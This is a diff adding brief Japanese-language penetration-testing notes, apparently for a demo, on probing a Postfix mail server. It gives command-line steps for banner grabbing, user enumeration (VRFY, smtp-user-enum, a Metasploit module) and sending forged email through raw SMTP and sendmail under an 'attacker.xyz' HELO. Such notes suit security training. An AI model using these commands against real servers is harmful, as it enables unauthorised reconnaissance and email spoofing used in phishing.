@@ -1,0 +1,30 @@
+demo Postfix Recon
+1) 以下のコマンドを使うことで、サーバー名とバナーを知ることができる
+nmap -sV -script banner ターゲットドメイン
+2) 以下のコマンドを使って、サーバーのホスト名（ドメイン名）を取得する
+nc ターゲットドメイン 25
+3) netcatを使って、SMTPサービスに接続して、サーバーマシンにいるユーザーを以下のコマンドで確認する
+VRFY User_name@サーバーのホスト名
+4) telnetを使って、SMTPに接続して、サポートされているコマンドや機能を確認する
+telnet ターゲットドメイン 25
+HELO attacker.xyz
+EHLO attacker.xyz
+5) smtp-user-enumを使って、調べたいユーザーがサーバー上に幾つ存在するかを確認する
+smtp-user-enum /usr/share/commix/src/txt/usernames.txt -t ターゲットドメイン
+metasploitを使用した場合
+msfconsole
+search smtp_enum
+use 0
+exploit
+6) telnetを使用して、偽メールを送ることもできる
+telnet ターゲットドメイン 25
+HELO attacker.xyz
+mail from: my_mail アドレス
+rcpt：相手のメールアドレス
+data
+Subject：
+本文
+.(このドットは、終了を示すサイン）
+
+sendmailコマンドでも同じことをすることができる
+sendmail -f 自分のメールアドレス -t 相手のメールアドレス -s ターゲットドメイン -u Fakemail -m "本文" -o tls=no
